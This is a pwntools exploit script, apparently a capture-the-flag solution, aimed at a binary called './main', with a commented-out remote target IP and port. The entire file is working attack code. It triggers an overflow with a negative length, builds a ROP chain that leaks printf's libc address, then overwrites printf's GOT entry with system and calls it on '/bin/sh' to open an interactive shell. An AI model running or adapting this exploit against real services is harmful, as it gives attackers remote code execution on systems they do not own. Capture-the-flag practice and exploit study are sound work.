from pwn import *
#target = remote('54.225.38.91', 1027)
target=process('./main')
elf = ELF('./main')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.terminal=["tmux","split","-h"]
#gdb.attach(target)
print(target.recvuntil("length:"))
target.sendline("-1")
print("-1")
print(target.recvuntil("ID:"))
target.sendline("1")
print("1")
print(target.recvuntil("message:"))
payload = "A"*120
poprdi = 0x400a93
poprsir15 = 0x400a91
# writeable section
writeaddr = 0x601100
puts_plt = 0x400700
read_plt = elf.symbols["read"]
printf_got = elf.got["printf"]
# leak addr of printf in randomized libc
payload += p64(poprdi)
payload += p64(printf_got)
payload += p64(puts_plt)
# read address of "/bin/sh" in libc from stdin into a writeable section
payload += p64(poprdi)
payload += p64(0x0)
payload += p64(poprsir15)
payload += p64(writeaddr)
payload += p64(0x0)
payload += p64(read_plt)
# read address of system in libc from stdin into GOT entry of printf
payload += p64(poprdi)
payload += p64(0x0)
payload += p64(poprsir15)
payload += p64(printf_got)
payload += p64(0x0)
payload += p64(read_plt)
# call printf (now system("/bin/sh"))
payload += p64(poprdi)
payload += p64(writeaddr)
payload += p64(printf_got)
# send payload
target.sendline(payload)
print(target.recvuntil("Goodbye!\n"))
# receive printf_libc in randomized libc
sleep(1)
leak0 = target.recvline().strip("\n")
printf_libc = u64(leak0+"\x00"*(8-len(leak0)))
print(hex(printf_libc))
# get other addresses in libc
libc_base = printf_libc-libc.symbols["printf"]
libc_system = libc_base+libc.symbols["system"]
libc_binsh = libc_base+libc.search("/bin/sh").next()
# send address of libc_binsh to the first read
target.sendline(p64(libc_binsh))
# send address of libc_system to the second read
sleep(1)
target.send(p64(libc_system))
target.interactive()
